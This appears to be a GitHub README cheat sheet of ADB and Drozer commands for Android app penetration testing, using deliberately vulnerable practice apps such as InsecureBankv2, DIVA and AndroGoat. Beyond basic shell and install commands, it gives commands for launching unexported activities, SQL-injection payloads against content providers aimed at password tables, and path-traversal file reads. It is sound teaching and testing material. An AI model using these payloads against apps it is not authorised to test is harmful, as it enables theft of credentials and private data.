# adb-cheatsheat
Contains all ADB commands

## Basic commands
Normal user shell access
```
adb shell
```

Root user shell access
```
adb root
adb shell
```

Root  user access from shell
```
adb shell
su
```

Install APKs
```
adb install <apkname>
```

Uninstall APKs
```
adb uninstall <apkname>
```

Uploading files or folders
```
adb push <sourcepath> <destinationpath>
```

Downloading files or folders
```
adb pull <sourcepath> <destinationpath>
```

Listing installed packages; Here pm means Package manager
```
adb shell pm list packages
```

Getting bask apk path or source apks path
```
adb shell pm path <packagename>
```

## Activity, Service & Broadcast handling
### Activity
**-n** component name(Pull path to activity). This below commands send Intent to launch activities
```
adb shell am start-activity -n packagename/activityname
```
Example:
```
adb shell am start-activity -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
                        [OR]
adb shell am start-activity -n com.android.insecurebankv2/.PostLogin
```
DROZER</br>
Listing activities</br>
```
dz> run app.activity.info -a jakhar.aseem.diva   #listing activities
```
Starting activity</br>
-a is used to specify action example: -a android.intent.action.VIEW </br>
--extra is to specify strings example: --extra key value </br>
--data-uri is to specify datauri example: --data-uri "https://hello?abc=hii" </br>
--component is to specify activity which takes packagename & activity name example: --component jakhar.aseem.diva jakhar.aseem.diva.MainActivity
```
dz> run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.MainActivity  #starting activities
```


#### Intent options with Activities
Combining Action with Activity -a android.intent.action.VIEW 
```
adb shell am start-activity -a android.intent.action.VIEW -n com.android.insecurebankv2/.PostLogin
```

Sending strings via extra strings with Intent
```
--es key "value" or -e key "value"
adb shell am start-activity -n com.android.insecurebankv2/.PostLogin --es reg_url "https://3kal.medium.com"
```

Sending data via data URI with Intent
```
-d <DATA_URI>
adb shell am start-activity -n com.android.insecurebankv2/.PostLogin -d "https://hello?abc=hii"
```

### Broadcast
Sending strings via Intent with broadcast receivers
```
adb shell am broadcast -n <broadcastname> -a <actionname> -e key value
```
Example:
```
adb shell am broadcast -n com.android.insecurebankv2/.BrReciever -a android.intent.action.ACTION_SEND -e uid appsec
```

### Services exploit
Sending strings via Intent with services
```
adb shell am startservice -n <servicename> --es key value
```
Example:
```
adb shell am startservice -n com.androgoat/.DataLeakService --es "leak_data" "tr"
```

#### Exploiting Content providers
Content provider to access to database
```
adb shell content query --uri <contentprovideruri>
```
Example:
```
adb shell content query --uri content://com.example.vulnerableapp.provider/pwds
adb shell content query --uri content://com.example.vulnerableapp.provider/pwds --projection "'"
adb shell content query --uri content://com.example.vulnerableapp.provider --projection "' UNION SELECT * FROM sqlite_master WHERE type='table';-- "
```
DROZER
```
dz> run app.provider.info -a com.abc.testabc   #list content providers with packagname look for exported & permission NULL
dz> run scanner.provider.finduris -a com.abc.testabc  #scan vulnerable content providers
dz> run scanner.provider.sqltables --uri content://com.abc.testabc.contentprovider/pwds/  #list all tables in vulnerable content provider
dz> run scanner.provider.injection --uri content://com.abc.testabc.contentprovider/pwds/  #list vulnerable content providers
dz> run app.provider.query --uri content://com.abc.testabc.contentprovider/pwds/ --projection "'"  #query for sqlinjection
dz> run app.provider.query --uri content://com.abc.testabc.contentprovider/pwds/ --projection " * FROM passwords;"  #querying database
```

Content provider to access files
```
adb shell content read --uri <contentprovideruri>
```
Example:
```
adb shell content read --uri content://com.example.vulnerableapp.provider/../../../../test.txt
```
DROZER
```
dz> run scanner.provider.traversal -a com.abc.testabc   #scan for pathtraversal vulnerable contentprovider
dz> run app.provider.read content://com.example.vulnerableapp.provider/../../../../test.txt   #exploting & reading files
```

